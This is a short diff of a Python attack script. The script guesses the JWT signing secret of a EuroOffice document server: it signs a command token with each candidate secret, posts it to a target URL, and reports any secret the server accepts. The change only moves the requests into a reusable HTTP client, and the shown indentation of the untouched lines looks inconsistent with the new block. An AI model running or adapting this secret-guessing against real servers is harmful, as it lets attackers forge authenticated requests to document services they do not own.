@@ -19,16 +19,17 @@ print(f"[*] Testing EuroOffice JWT Secret against {target_url}...\n")
 
 matched = None
 
-for s in candidates:
-    token = jwt.encode({"c": "version"}, s, algorithm="HS256")
-    body = {"c": "version", "token": token}
-    headers = {
-        "Content-Type": "application/json",
-        "Authorization": f"Bearer {token}",
-    }
-    try:
-        r = httpx.post(target_url, json=body, headers=headers, timeout=5.0)
-        res = r.text.strip()
+with httpx.Client(trust_env=False, timeout=5.0) as client:
+    for s in candidates:
+        token = jwt.encode({"c": "version"}, s, algorithm="HS256")
+        body = {"c": "version", "token": token}
+        headers = {
+            "Content-Type": "application/json",
+            "Authorization": f"Bearer {token}",
+        }
+        try:
+            r = client.post(target_url, json=body, headers=headers)
+            res = r.text.strip()
         if '"error":0' in res or '"error": 0' in res:
             print(f"[SUCCESS] MATCH FOUND! Secret is: '{s}'")
             print(f"          Response: {res}")
